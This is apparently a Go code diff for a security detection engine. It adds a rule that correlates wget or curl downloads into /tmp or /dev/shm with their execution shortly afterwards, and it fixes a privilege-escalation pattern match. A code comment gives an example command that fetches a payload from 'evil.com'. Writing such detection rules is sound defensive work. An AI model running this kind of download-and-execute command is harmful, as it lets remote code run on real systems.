@@ -27,6 +27,7 @@ type StateManager struct {
 	BruteForceAlertedIPs    map[string]bool
 	IPWatchlist             map[string]bool      // Set to store known bad IP addresses for fast lookups
 	SuspiciousLoginTracker  map[string]time.Time // track recent suspicious logins to correlate with later activity
+	StagedPayloads          map[string]time.Time
 }
 
 type ProcessExecution struct {
@@ -79,6 +80,7 @@ func NewStateManager() *StateManager {
 		FailedLoginAttempts:     make(map[string][]time.Time),
 		IPWatchlist:             make(map[string]bool),
 		ProcessExecutionHistory: make(map[string][]ProcessExecution),
+		StagedPayloads:          make(map[string]time.Time),
 		SuspiciousCommandCount:  make(map[string]int),
 		SuspiciousLoginTracker:  make(map[string]time.Time),
 		UserLoginLocations:      make(map[string]map[string]bool),
@@ -337,7 +339,7 @@ func correlateLoginAndEscalation(event model.Event, existingAlerts []model.Alert
 		command := event.Metadata["command"]
 
 		for _, pattern := range privEscPatterns {
-			if strings.Contains(pattern, command) {
+			if strings.Contains(command, pattern) {
 				isPrivEsc = true
 				break
 			}
@@ -370,6 +372,63 @@ func correlateLoginAndEscalation(event model.Event, existingAlerts []model.Alert
 	return nil
 }
 
+func extractFilePath(command string) string {
+	parts := strings.Fields(command)
+
+	for _, part := range parts {
+		if strings.HasPrefix(part, "/tmp/") || strings.HasPrefix(part, "/dev/shm") {
+			return part
+		}
+	}
+	return ""
+}
+
+func correlateDownloadAndExecute(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert {
+	if event.EventType != "Process_Execute" {
+		return nil
+	}
+
+	// full chain. download -> make executable -> execute
+	// wget -O /tmp/payload.sh http://evil.com/payload.sh
+	command := event.Metadata["command"]
+	processName := event.Metadata["process_name"]
+
+	if processName == "wget" || processName == "curl" {
+		filepath := extractFilePath(command)
+
+		if filepath != "" {
+			state.mu.Lock()
+			state.StagedPayloads[filepath] = event.Timestamp
+			state.mu.Unlock()
+			slog.Debug("Stages a potential payload for correlation", "path", filepath)
+		}
+	}
+
+	state.mu.Lock()
+	defer state.mu.Unlock()
+
+	for stagedPath, downloadTime := range state.StagedPayloads {
+		if strings.Contains(command, stagedPath) && event.Timestamp.Sub(downloadTime) <= 2*time.Minute {
+			delete(state.StagedPayloads, stagedPath)
+			return &model.Alert{
+				RuleName:  "CorrelatedDownloadAndExecute",
+				Message:   fmt.Sprintf("Attack Chain Detected: A file was downloaded to %s and then executed.", stagedPath),
+				Severity:  "CRITICAL",
+				Timestamp: event.Timestamp,
+				Source:    event.Source,
+				Metadata: map[string]string{
+					"mitre_technique":   "T1105",
+					"time_to_execution": event.Timestamp.Sub(downloadTime).String(),
+					"executed_command":  command,
+					"staged_filepath":   stagedPath,
+				},
+			}
+		}
+	}
+
+	return nil
+}
+
 // activeRules is the registry of all rules the engine will run.
 var activeRules = []Rule{
 	checkFailedLogins,
@@ -380,6 +439,7 @@ var activeRules = []Rule{
 
 var activeCorrelationRules = []CorrelationRule{
 	correlateLoginAndEscalation,
+	correlateDownloadAndExecute,
 }
 
 func EvaluateEvent(event model.Event, yamlRules []RuleDefinition, state *StateManager) []model.Alert {
